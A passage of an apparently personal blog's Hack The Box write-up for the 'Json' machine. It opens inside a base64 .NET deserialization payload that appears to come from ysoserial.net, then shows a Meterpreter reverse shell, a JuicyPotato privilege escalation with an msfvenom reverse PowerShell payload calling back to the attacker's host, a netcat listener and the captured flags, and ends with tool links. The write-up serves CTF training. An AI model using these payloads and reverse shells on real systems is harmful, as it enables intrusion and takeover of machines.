XOXVTRzlzWkdWeUwxTjVjM1JsYlM1U1pXWnNaV04wYVc5dUxrMWxiV0psY2tsdVptOVRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlDUWdBQUFBSkNRQUFBQWtLQUFBQUJBZ0FBQUF3VTNsemRHVnRMa1JsYkdWbllYUmxVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUJ3QUFBQVIwZVhCbENHRnpjMlZ0WW14NUJuUmhjbWRsZEJKMFlYSm5aWFJVZVhCbFFYTnpaVzFpYkhrT2RHRnlaMlYwVkhsd1pVNWhiV1VLYldWMGFHOWtUbUZ0WlExa1pXeGxaMkYwWlVWdWRISjVBUUVDQVFFQkF6QlRlWE4wWlcwdVJHVnNaV2RoZEdWVFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUswUmxiR1ZuWVhSbFJXNTBjbmtHQ3dBQUFMQUNVM2x6ZEdWdExrWjFibU5nTTF0YlUzbHpkR1Z0TGxOMGNtbHVaeXdnYlhOamIzSnNhV0lzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNVhTeGJVM2x6ZEdWdExsTjBjbWx1Wnl3Z2JYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVYU3hiVTNsemRHVnRMa1JwWVdkdWIzTjBhV056TGxCeWIyTmxjM01zSUZONWMzUmxiU3dnVm1WeWMybHZiajAwTGpBdU1DNHdMQ0JEZFd4MGRYSmxQVzVsZFhSeVlXd3NJRkIxWW14cFkwdGxlVlJ2YTJWdVBXSTNOMkUxWXpVMk1Ua3pOR1V3T0RsZFhRWU1BQUFBUzIxelkyOXliR2xpTENCV1pYSnphVzl1UFRRdU1DNHdMakFzSUVOMWJIUjFjbVU5Ym1WMWRISmhiQ3dnVUhWaWJHbGpTMlY1Vkc5clpXNDlZamMzWVRWak5UWXhPVE0wWlRBNE9Rb0dEUUFBQUVsVGVYTjBaVzBzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJnNEFBQUFhVTNsemRHVnRMa1JwWVdkdWIzTjBhV056TGxCeWIyTmxjM01HRHdBQUFBVlRkR0Z5ZEFrUUFBQUFCQWtBQUFBdlUzbHpkR1Z0TGxKbFpteGxZM1JwYjI0dVRXVnRZbVZ5U1c1bWIxTmxjbWxoYkdsNllYUnBiMjVJYjJ4a1pYSUhBQUFBQkU1aGJXVU1RWE56WlcxaWJIbE9ZVzFsQ1VOc1lYTnpUbUZ0WlFsVGFXZHVZWFIxY21VS1UybG5ibUYwZFhKbE1ncE5aVzFpWlhKVWVYQmxFRWRsYm1WeWFXTkJjbWQxYldWdWRITUJBUUVCQVFBRENBMVRlWE4wWlcwdVZIbHdaVnRkQ1E4QUFBQUpEUUFBQUFrT0FBQUFCaFFBQUFBK1UzbHpkR1Z0TGtScFlXZHViM04wYVdOekxsQnliMk5sYzNNZ1UzUmhjblFvVTNsemRHVnRMbE4wY21sdVp5d2dVM2x6ZEdWdExsTjBjbWx1WnlrR0ZRQUFBRDVUZVhOMFpXMHVSR2xoWjI1dmMzUnBZM011VUhKdlkyVnpjeUJUZEdGeWRDaFRlWE4wWlcwdVUzUnlhVzVuTENCVGVYTjBaVzB1VTNSeWFXNW5LUWdBQUFBS0FRb0FBQUFKQUFBQUJoWUFBQUFIUTI5dGNHRnlaUWtNQUFBQUJoZ0FBQUFOVTNsemRHVnRMbE4wY21sdVp3WVpBQUFBSzBsdWRETXlJRU52YlhCaGNtVW9VM2x6ZEdWdExsTjBjbWx1Wnl3Z1UzbHpkR1Z0TGxOMGNtbHVaeWtHR2dBQUFESlRlWE4wWlcwdVNXNTBNeklnUTI5dGNHRnlaU2hUZVhOMFpXMHVVM1J5YVc1bkxDQlRlWE4wWlcwdVUzUnlhVzVuS1FnQUFBQUtBUkFBQUFBSUFBQUFCaHNBQUFCeFUzbHpkR1Z0TGtOdmJYQmhjbWx6YjI1Z01WdGJVM2x6ZEdWdExsTjBjbWx1Wnl3Z2JYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVYVjBKREFBQUFBb0pEQUFBQUFrWUFBQUFDUllBQUFBS0N3PT0nCiAgICAgICAgICAgICAgICB9’</p>
+<p>msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.14.8:4400 [*] Sending stage (206403 bytes) to 10.10.10.158 [*] Meterpreter session 4 opened (10.10.14.8:4400 -&gt; 10.10.10.158:55588) at 2020-01-24 09:18:51 +0100</p>
+<p>meterpreter &gt; shell Process 2464 created. Channel 1 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved.</p>
+<p>c:&gt; whoami json</p>
+<ol start="5" type="1">
+<li><p>Grab user.txt</p>
+<p>C:&gt;type user.txt 3445****************************</p></li>
+</ol>
+<p>██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████</p>
+<p>██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝</p>
+<ol type="1">
+<li><p>Looking at our users privileges we notice that SeImpersonatePrivilege is enabled. This would allow us to use JuicyPotato for privilege escalation.</p>
+<p>c:Files (x86)Server&gt;whoami /priv</p>
+<p>PRIVILEGES INFORMATION ———————-</p>
+<p>Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</p></li>
+<li><p>Upload JuicyPotato.exe to the victim machine. C:&gt;copy \10.10.14.8-share.exe .</p></li>
+<li><p>Create a malicious payload to execute a reverse shell. root@p3:/opt/htb/machines/json# msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.8 lport=4499 &gt; json-privesc.bat [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder or badchars specified, outputting raw payload Payload size: 1223 bytes</p>
+<p>root@p3:/opt/htb/machines/json# cp json-privesc.bat /srv/pub-share/ root@p3:/opt/htb/machines/json# chmod +x /srv/pub-share/json-privesc.bat</p></li>
+<li><p>Grab a random CLSID from JuicyPotato’s GitHub, start netcat, and execute your exploit.</p>
+<p>C:&gt;JuicyPotato.exe -l 1444 -p c:.exe -a “/c \10.10.14.8-share-privesc.bat” -t * -c {eff7f153-1c97-417a-b633-fede6683a939} Testing {eff7f153-1c97-417a-b633-fede6683a939} 1444 …. [+] authresult 0 {eff7f153-1c97-417a-b633-fede6683a939};NT AUTHORITY</p>
+<p>[+] CreateProcessWithTokenW OK</p>
+<p>root@p3:/opt/htb/machines/json# nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.158] 49686 Microsoft Windows [Version 6.3.9600]</p>
+<ol start="3" type="a">
+<li>2013 Microsoft Corporation. All rights reserved.</li>
+</ol>
+<p>C:&gt;whoami nt authority C:&gt;type root.txt 3cc85d1bed2ee84af4074101b991d441</p></li>
+</ol>
+<p>██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████</p>
+<p>██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝</p>
+<p>ysoserial.net https://github.com/Lexus89/ysoserial.net https://github.com/pwntester/ysoserial.net https://github.com/frohoff/ysoserial (For Java applications) https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution https://www.kitploit.com/2017/11/ysoserialnet-deserialization-payload.html https://book.hacktricks.xyz/pentesting-web/unserialization</p>
+<p>JuicyPotato https://github.com/ohpe/juicy-potato https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter</p>
+
+
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+  window.document.addEventListener("DOMContentLoaded", function (event) {
+    const icon = "";
+    const anchorJS = new window.AnchorJS();
+    anchorJS.options = {
+      placement: 'right',
+      icon: icon
+    };
+    anchorJS.add('.anchored');
+    const isCodeAnnotation = (el) => {
+      for (const clz of el.classList) {
+        if (clz.startsWith('code-annotation-')) {                     
+          return true;
+        }
+      }
+      return false;
+    }
+    const onCopySuccess = function(e) {
+      // button target
+      const button = e.trigger;
+      // don't keep focus
+      button.blur();
+      // flash "checked"
+      button.classList.add('code-copy-button-checked');
+      var currentTitle = button.getAttribute("title");
+      button.setAttribute("title", "Copied!");
+      let tooltip;
+      if (window.bootstrap) {
+        button.setAttribute("data-bs-toggle", "tooltip");
+        button.setAttribute("data-bs-placement", "left");
+        button.setAttribute("data-bs-title", "Copied!");
+        tooltip = new bootstrap.Tooltip(button, 
+          { trigger: "manual", 
+            customClass: "code-copy-button-tooltip",
+            offset: [0, -8]});
+        tooltip.show();    
+      }
+      setTimeout(function() {
+        if (tooltip) {
+          tooltip.hide();
+          button.removeAttribute("data-bs-title");
+          button.removeAttribute("data-bs-toggle");
+          button.removeAttribute("data-bs-placement");
+        }
+        button.setAttribute("title", currentTitle);
+        button.classList.remove('code-copy-button-checked');
+      }, 1000);
+      // clear code selection
+      e.clearSelection();
+    }
+    const getTextToCopy = function(trigger) {
+        const codeEl = trigger.previousElementSibling.cloneNode(true);
+        for (const childEl of codeEl.children) {
+          if (isCodeAnnotation(childEl)) {
+            childEl.remove();
+          }
+        }
+        return codeEl.innerText;
+    }
+    const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+      text: getTextToCopy
+    });
+    clipboard.on('success', onCopySuccess);
+    if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+      const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+        text: getTextToCopy,
+        container: window.document.getElementById('quarto-embedded-source-code-modal')
+      });
+      clipboardModal.on('success', onCopySuccess);
+    }
+      var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+      var mailtoRegex = new RegExp(/^mailto:/);
+        var filterRegex = new RegExp("https:\/\/exploit\.se");
+      var isInternal = (href) => {
+          return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+      }
+      // Inspect non-navigation links and adorn them if external
+     var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+      for (var i=0; i<links.length; i++) {
+        const link = links[i];
+        if (!isInternal(link.href)) {
+          // undo the damage that might have been done by quarto-nav.js in the case of
+          // links that we want to consider external
+          if (link.dataset.originalHref !== undefined) {
+            link.href = link.dataset.originalHref;
+          }
+        }
+      }
+    function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+      const config = {
+        allowHTML: true,
+        maxWidth: 500,
+        delay: 100,
+        arrow: false,
+        appendTo: function(el) {
+            return el.parentElement;
+        },
+        interactive: true,
+        interactiveBorder: 10,
+        theme: 'quarto',
+        placement: 'bottom-start',
+      };
+      if (contentFn) {
+        config.content = contentFn;
+      }
+      if (onTriggerFn) {
+        config.onTrigger = onTriggerFn;
+      }
+      if (onUntriggerFn) {
+        config.onUntrigger = onUntriggerFn;
+      }
+      window.tippy(el, config); 
+    }
+    const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+    for (var i=0; i<noterefs.length; i++) {
+      const ref = noterefs[i];
+      tippyHover(ref, function() {
+        // use id or data attribute instead here
+        let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+        try { href = new URL(href).hash; } catch {}
+        const id = href.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note) {
+          return note.innerHTML;
+        } else {
+          return "";
+        }
+      });
+    }
+    const xrefs = window.document.querySelectorAll('a.quarto-xref');
+    const processXRef = (id, note) => {
+      // Strip column container classes
+      const stripColumnClz = (el) => {
+        el.classList.remove("page-full", "page-columns");
+        if (el.children) {
+          for (const child of el.children) {
+            stripColumnClz(child);
+          }
+        }
+      }
+      stripColumnClz(note)
+      if (id === null || id.startsWith('sec-')) {
+        // Special case sections, only their first couple elements
+        const container = document.createElement("div");
+        if (note.children && note.children.length > 2) {
+          container.appendChild(note.children[0].cloneNode(true));
+          for (let i = 1; i < note.children.length; i++) {
+            const child = note.children[i];
+            if (child.tagName === "P" && child.innerText === "") {
+              continue;
+            } else {
+              container.appendChild(child.cloneNode(true));
+              break;
+            }
+          }
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(container);
+          }
+          return container.innerHTML
+        } else {
+          if (window.Quarto?.typesetMath) {
+            window.Quarto.typesetMath(note);
+          }
+          return note.innerHTML;
+        }
+      } else {
+        // Remove any anchor links if they are present
+        const anchorLink = note.querySelector('a.anchorjs-link');
+        if (anchorLink) {
+          anchorLink.remove();
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        if (note.classList.contains("callout")) {
+          return note.outerHTML;
+        } else {
+          return note.innerHTML;
+        }
+      }
+    }
+    for (var i=0; i<xrefs.length; i++) {
+      const xref = xrefs[i];
+      tippyHover(xref, undefined, function(instance) {
+        instance.disable();
+        let url = xref.getAttribute('href');
+        let hash = undefined; 
+        if (url.startsWith('#')) {
+          hash = url;
+        } else {
+          try { hash = new URL(url).hash; } catch {}
+        }
+        if (hash) {
+          const id = hash.replace(/^#\/?/, "");
+          const note = window.document.getElementById(id);
+          if (note !== null) {
+            try {
+              const html = processXRef(id, note.cloneNode(true));
+              instance.setContent(html);
+            } finally {
+              instance.enable();
+              instance.show();
+            }
+          } else {
+            // See if we can fetch this
+            fetch(url.split('#')[0])
+            .then(res => res.text())
+            .then(html => {
+              const parser = new DOMParser();
+              const htmlDoc = parser.parseFromString(html, "text/html");
+              const note = htmlDoc.getElementById(id);
+              if (note !== null) {
+                const html = processXRef(id, note);
+                instance.setContent(html);
+              } 
+            }).finally(() => {
+              instance.enable();
+              instance.show();
+            });
+          }
+        } else {
+          // See if we can fetch a full url (with no hash to target)
+          // This is a special case and we should probably do some content thinning / targeting
+          fetch(url)
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.querySelector('main.content');
+            if (note !== null) {
+              // This should only happen for chapter cross references
+              // (since there is no id in the URL)
+              // remove the first header
+              if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+                note.children[0].remove();
+              }
+              const html = processXRef(null, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      }, function(instance) {
+      });
+    }
+        let selectedAnnoteEl;
+        const selectorForAnnotation = ( cell, annotation) => {
+          let cellAttr = 'data-code-cell="' + cell + '"';
+          let lineAttr = 'data-code-annotation="' +  annotation + '"';
+          const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+          return selector;
+        }
+        const selectCodeLines = (annoteEl) => {
+          const doc = window.document;
+          const targetCell = annoteEl.getAttribute("data-target-cell");
+          const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+          const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+          const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+          const lineIds = lines.map((line) => {
+            return targetCell + "-" + line;
+          })
+          let top = null;
+          let height = null;
+          let parent = null;
+          if (lineIds.length > 0) {
+              //compute the position of the single el (top and bottom and make a div)
+              const el = window.document.getElementById(lineIds[0]);
+              top = el.offsetTop;
+              height = el.offsetHeight;
+              parent = el.parentElement.parentElement;
+            if (lineIds.length > 1) {
+              const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+              const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+              height = bottom - top;
+            }
+            if (top !== null && height !== null && parent !== null) {
+              // cook up a div (if necessary) and position it 
+              let div = window.document.getElementById("code-annotation-line-highlight");
+              if (div === null) {
+                div = window.document.createElement("div");
+                div.setAttribute("id", "code-annotation-line-highlight");
+                div.style.position = 'absolute';
+                parent.appendChild(div);
+              }
+              div.style.top = top - 2 + "px";
+              div.style.height = height + 4 + "px";
+              div.style.left = 0;
+              let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+              if (gutterDiv === null) {
+                gutterDiv = window.document.createElement("div");
+                gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+                gutterDiv.style.position = 'absolute';
+                const codeCell = window.document.getElementById(targetCell);
+                const gutter = codeCell.querySelector('.code-annotation-gutter');
+                gutter.appendChild(gutterDiv);
+              }
+              gutterDiv.style.top = top - 2 + "px";
+              gutterDiv.style.height = height + 4 + "px";
+            }
+            selectedAnnoteEl = annoteEl;
+          }
+        };
+        const unselectCodeLines = () => {
+          const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+          elementsIds.forEach((elId) => {
+            const div = window.document.getElementById(elId);
+            if (div) {
+              div.remove();
+            }
+          });
+          selectedAnnoteEl = undefined;
+        };
+          // Handle positioning of the toggle
+      window.addEventListener(
+        "resize",
+        throttle(() => {
+          elRect = undefined;
+          if (selectedAnnoteEl) {
+            selectCodeLines(selectedAnnoteEl);
+          }
+        }, 10)
+      );
+      function throttle(fn, ms) {
+      let throttle = false;
+      let timer;
+        return (...args) => {
+          if(!throttle) { // first call gets through
+              fn.apply(this, args);
+              throttle = true;
+          } else { // all the others get throttled
+              if(timer) clearTimeout(timer); // cancel #2
+              timer = setTimeout(() => {
+                fn.apply(this, args);
+                timer = throttle = false;
+              }, ms);
+          }
+        };
+      }
+        // Attach click handler to the DT
+        const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+        for (const annoteDlNode of annoteDls) {
+          annoteDlNode.addEventListener('click', (event) => {
+            const clickedEl = event.target;
+            if (clickedEl !== selectedAnnoteEl) {
+              unselectCodeLines();
+              const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+              if (activeEl) {
+                activeEl.classList.remove('code-annotation-active');
+              }
+              selectCodeLines(clickedEl);
+              clickedEl.classList.add('code-annotation-active');
+            } else {
+              // Unselect the line
+              unselectCodeLines();
+              clickedEl.classList.remove('code-annotation-active');
+            }
+          });
+        }
+    const findCites = (el) => {
+      const parentEl = el.parentElement;
+      if (parentEl) {
+        const cites = parentEl.dataset.cites;
+        if (cites) {
+          return {
+            el,
+            cites: cites.split(' ')
+          };
+        } else {
+          return findCites(el.parentElement)
+        }
+      } else {
+        return undefined;
+      }
+    };
+    var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+    for (var i=0; i<bibliorefs.length; i++) {
+      const ref = bibliorefs[i];
+      const citeInfo = findCites(ref);
+      if (citeInfo) {
+        tippyHover(citeInfo.el, function() {
+          var popup = window.document.createElement('div');
+          citeInfo.cites.forEach(function(cite) {
+            var citeDiv = window.document.createElement('div');
+            citeDiv.classList.add('hanging-indent');
+            citeDiv.classList.add('csl-entry');
+            var biblioDiv = window.document.getElementById('ref-' + cite);
+            if (biblioDiv) {
+              citeDiv.innerHTML = biblioDiv.innerHTML;
+            }
+            popup.appendChild(citeDiv);
+          });
+          return popup.innerHTML;
+        });
+      }
+    }
+  });
+  </script>
+</div> <!-- /content -->
+<footer class="footer">
+  <div class="nav-footer">
+    <div class="nav-footer-left">
+      &nbsp;
+    </div>   
+    <div class="nav-footer-center">
+      <ul class="footer-items list-unstyled">
+    <li class="nav-item">
+ © 2025 0xPThree - All Rights Reserved.
+  </li>  
+</ul>
+    </div>
+    <div class="nav-footer-right">
+      <ul class="footer-items list-unstyled">
+    <li class="nav-item compact">
+    <a class="nav-link" href="https://signal.me/#eu/PjVScis0spvu9_S_xNysergThKuqsWQFOwQ7xisr7HJgaJT69xC0Ku2fo3Ng0B1">
+      <i class="bi bi-signal" role="img">
+</i> 
+    </a>
+  </li>  
+    <li class="nav-item compact">
+    <a class="nav-link" href="https://github.com/0xpthree">
+      <i class="bi bi-github" role="img">
+</i> 
+    </a>
+  </li>  
+    <li class="nav-item compact">
+    <a class="nav-link" href="../../index.xml">
+      <i class="bi bi-rss" role="img">
+</i> 
+    </a>
+  </li>  
+</ul>
+    </div>
+  </div>
+</footer>
+
+
+
+
+</body></html>
